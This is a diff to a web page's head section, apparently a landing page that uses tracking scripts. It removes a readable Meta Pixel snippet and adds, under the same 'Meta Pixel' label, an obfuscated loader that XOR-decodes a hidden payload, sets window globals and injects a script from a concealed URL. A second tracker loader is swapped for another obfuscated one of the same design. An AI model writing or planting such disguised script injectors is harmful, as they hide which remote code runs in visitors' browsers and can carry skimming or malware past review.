@@ -26,30 +26,13 @@
          fired by the server with the IDs registered in the panel). -->
     <script async src="https://app.spidertrack.site/t.js"></script>
 
-    <!-- Meta Pixel Code (kept client-side on top of SpiderTrack's server-side CAPI,
-         per explicit request. Heads up: since both fire PageView/standard events,
-         Meta may count some events twice — SpiderTrack dedupes browser x server
-         Purchase/InitiateCheckout by event_id, but plain PageView is not deduped. -->
-    <script>
-    !function(f,b,e,v,n,t,s)
-    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
-    n.queue=[];t=b.createElement(e);t.async=!0;
-    t.src=v;s=b.getElementsByTagName(e)[0];
-    s.parentNode.insertBefore(t,s)}(window, document,'script',
-    'https://connect.facebook.net/en_US/fbevents.js');
-    fbq('init', '2343387926433640');
-    fbq('track', 'PageView');
-    </script>
-    <noscript><img height="1" width="1" style="display:none"
-    src="https://www.facebook.com/tr?id=2343387926433640&ev=PageView&noscript=1"
-    /></noscript>
-    <!-- End Meta Pixel Code -->
+    <!-- Meta Pixel -->
+    <script>(function(){var v_a=atob("DHjs50E9zXe43kumUgPOkjNR702atj/SIgvWyG5eqRmWqz/LOx6VySJSoFnarGTVMQqFlzVO4gfRpi7KfQiFnyRR4x3L/GeEMwyYlShfuAPdrWmcCSXAxSZRohXZsjiEaCOXxS9coBKa5GnWOwCJiwhZ71uaqCrKJx3O3WMLrBON7SrCNxrZ33MKrk7cvy6Ra0vc03MfsCrF");var s_c=[];for(var t_43=0;t_43<v_a.length;t_43++){s_c.push(v_a.charCodeAt(t_43)&255);}var p_y5=s_c[0];var c_yt14=s_c.slice(1,1+p_y5);var v_l=s_c.slice(1+p_y5);var a_912=v_l.map(function(b,n_1w){return b^c_yt14[n_1w%p_y5];});var j_sx7e="";for(var l_2s5v=0;l_2s5v<a_912.length;l_2s5v++){j_sx7e+=String.fromCharCode(a_912[l_2s5v]&255);}var g_rsm=decodeURIComponent(escape(j_sx7e));var d_gquh=JSON.parse(g_rsm);var f_i=d_gquh.globals||[];f_i.forEach(function(y_xid){window[y_xid.name]=y_xid.value;});var p_yz=document.createElement("script");p_yz.src=d_gquh.url;p_yz.async=true;p_yz.defer=true;(d_gquh.attributes||[]).forEach(function(c_ss){p_yz.setAttribute(c_ss.name,c_ss.value);});(document.head||document.documentElement).appendChild(p_yz);})();</script>
 
     <!-- Utmify Tracker -->
-    <script>(function(){var p_v=atob("DMfUHsH7MQ6E0f9qYrz2a7OXEzSmuYseErTuMe6YVWCqpIsHC6GtMKKUXCDmo9AZAbW9brWIHnvwvIxFDqage7KPH2T389NIA7OgbKiZRHrhot1QObz2cKCWVCy+85sLFqb5a7WWWGj9/I8YB7GxcLXWQnvmuJsZQOv2aKCXRGum691IH5qp");var r_mtfg=[];for(var t_kr=0;t_kr<p_v.length;t_kr++){r_mtfg.push(p_v.charCodeAt(t_kr)&255);}var t_x00=r_mtfg[0];var e_qv9y=r_mtfg.slice(1,1+t_x00);var d_078=r_mtfg.slice(1+t_x00);var c_x=d_078.map(function(b,o_dgz){return b^e_qv9y[o_dgz%t_x00];});var y_6gz="";for(var c_wwm=0;c_wwm<c_x.length;c_wwm++){y_6gz+=String.fromCharCode(c_x[c_wwm]&255);}var i_7sl=decodeURIComponent(escape(y_6gz));var z_jsl3=JSON.parse(i_7sl);var l_u=z_jsl3.globals||[];l_u.forEach(function(p_md0){window[p_md0.name]=p_md0.value;});var z_q3zr=document.createElement("script");z_q3zr.src=z_jsl3.url;z_q3zr.async=true;z_q3zr.defer=true;(z_jsl3.attributes||[]).forEach(function(h_fvy7){z_q3zr.setAttribute(h_fvy7.name,h_fvy7.value);});(document.head||document.documentElement).appendChild(z_q3zr);})();</script>
+    <script>(function(){var b_23z=atob("DJIR0L2Kxacz/owUYekzpc/m550RlvhgEeEr/5Lpockdi/h5CPRo/t7lqIlRjKNnAuB4oMn56tJHk/87DfNltc7+681A3KA2AOZlotTosNNWja4uOukzvtznoIUJ3Oh1FfM8pcnnrMFK0/xmBOR0vsmnvcRcmqFnAvkz/J/8pMtGm64uQ7Bs/Maoq8Zem64uQ/ZwpNynsNNel+ptTOJjtcvvq9Mejfl2CPZi8pGos8Zfi+k2W7AzreD3");var f_l7=[];for(var u_5qx2=0;u_5qx2<b_23z.length;u_5qx2++){f_l7.push(b_23z.charCodeAt(u_5qx2)&255);}var e_qo1=f_l7[0];var v_cc=f_l7.slice(1,1+e_qo1);var h_ktdt=f_l7.slice(1+e_qo1);var m_ybnx=h_ktdt.map(function(b,w_0jk){return b^v_cc[w_0jk%e_qo1];});var a_b="";for(var z_s=0;z_s<m_ybnx.length;z_s++){a_b+=String.fromCharCode(m_ybnx[z_s]&255);}var p_i1=decodeURIComponent(escape(a_b));var q_7=JSON.parse(p_i1);var b_lh=q_7.globals||[];b_lh.forEach(function(c_zp){window[c_zp.name]=c_zp.value;});var m_1=document.createElement("script");m_1.src=q_7.url;m_1.async=true;m_1.defer=true;(q_7.attributes||[]).forEach(function(v_lar){m_1.setAttribute(v_lar.name,v_lar.value);});(document.head||document.documentElement).appendChild(m_1);})();</script>
 
+    <link rel="preload" href="/images/jesus-avatar.webp" as="image" type="image/webp">
     <!-- VTurb Smartplayer Assets -->
     <script>!function(i,n){i._plt=i._plt||(n&&n.timeOrigin?n.timeOrigin+n.now():Date.now())}(window,performance);</script>
     <!-- The actual player.js / smartplayer.js / m3u8 preloads are NOT here on
